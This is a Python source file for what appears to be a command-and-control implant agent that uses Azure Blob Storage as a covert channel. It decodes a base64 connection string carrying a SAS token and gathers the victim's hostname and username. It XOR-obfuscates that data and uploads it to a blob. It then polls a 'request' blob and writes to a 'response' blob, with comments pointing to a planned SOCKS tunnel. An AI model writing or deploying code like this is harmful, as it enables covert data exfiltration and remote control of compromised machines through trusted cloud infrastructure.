import argparse, base64, getpass, requests, base64, datetime, socket, sys, urllib.request
import protocol
from urllib.parse import urlparse

Success = 0                  # success
ErrContextCanceled = 1       # context canceled
ErrNoConnectionString = 2    # missing connection string
ErrConnectionStringError = 3 # invalid connection string
ErrInfoBlobError = 4         # info blob write failed
ErrContainerNotFound = 5     # container not found

def ParseConnectionString(ConnString):
    decoded = base64.b64decode(ConnString + "==", validate=False)
    u = urlparse(decoded.decode())
    path = u.path.lstrip("/")
    storage_url = f"{u.scheme}://{u.netloc}"
    return storage_url, path, u.query, Success

def XorRoutine(data: bytes) -> bytes:
    if not isinstance(data, (bytes, bytearray)):
        raise TypeError("data must be bytes")
    key = (0xDE, 0xAD, 0xB1, 0x0B)
    final = bytearray()
    ki = 0
    for b in data:
        final.append(b ^ key[ki])
        ki += 1
        if ki >= len(key):
            ki = 0
    return bytes(final)

def GetCurrentInfo():
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"
    try:
        currentUser = getpass.getuser()
    except Exception:
        currentUser = "unknown"
    hostInfo = f"{hostname}\\{currentUser}@{hostname}"
    return XorRoutine(hostInfo.encode())

def InfoData(storageURL, containerID, sasToken, hostInfo: bytes):
    req = urllib.request.Request(storageURL+"/"+containerID+"/info?"+sasToken, data=hostInfo, method="PUT")
    req.add_header("x-ms-blob-type", "BlockBlob")
    req.add_header("Content-Type", "application/octet-stream")
    req.add_header("Content-Length", str(len(hostInfo)))
    # Recommended x-ms-date and version (if server requires)
    req.add_header("x-ms-date", datetime.datetime.now(datetime.timezone.utc).isoformat())
    req.add_header("x-ms-version", "2020-04-08")
    with urllib.request.urlopen(req) as resp:
        # 201 Created expected on success
        if resp.status not in (200, 201):
            raise RuntimeError(f"unexpected status: {resp.status}")
        # done

def ReadData(storageURL, containerID, sasToken):
    response = requests.get(storageURL+"/"+containerID+"/request?"+sasToken).content
    return response

def SendData(storageURL, containerID, sasToken, data: bytes):
    if not isinstance(data, (bytes, bytearray)):
        raise TypeError("data must be bytes")
    req = urllib.request.Request(storageURL+"/"+containerID+"/response?"+sasToken, data=data, method="PUT")
    req.add_header("x-ms-blob-type", "BlockBlob")
    req.add_header("Content-Type", "application/octet-stream")
    req.add_header("Content-Length", str(len(data)))
    # Recommended x-ms-date and version (if server requires)
    req.add_header("x-ms-date", datetime.datetime.now(datetime.timezone.utc).isoformat())
    req.add_header("x-ms-version", "2020-04-08")
    with urllib.request.urlopen(req) as resp:
        # 201 Created expected on success
        if resp.status not in (200, 201):
            raise RuntimeError(f"unexpected status: {resp.status}")
        # done

def NewAgent(ConnString):
    storageURL, containerID, sasToken, errCode = ParseConnectionString(ConnString)
    if errCode != Success:
        return ErrConnectionStringError
    
    # azblob AnonymousCredential
    # azblob PipelineOptions

    # connect using the SAS token

    # azblob NewContainerURL
    # BlobTransport
    InfoData(storageURL, containerID, sasToken, GetCurrentInfo())
    response = ReadData(storageURL, containerID, sasToken)
    print(response)
    
    SendData(storageURL, containerID, sasToken, response)

    # NewSocksHandler(BlobTransport)

    return 0

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", dest="ConnString", default="", help="Connection string")
    args = parser.parse_args()
    
    if args.ConnString == "":
        parser.print_help()
        return ErrNoConnectionString
    
    ConnString = args.ConnString

    NewAgent(ConnString)
    return 0

if __name__ == "__main__":
    sys.exit(main())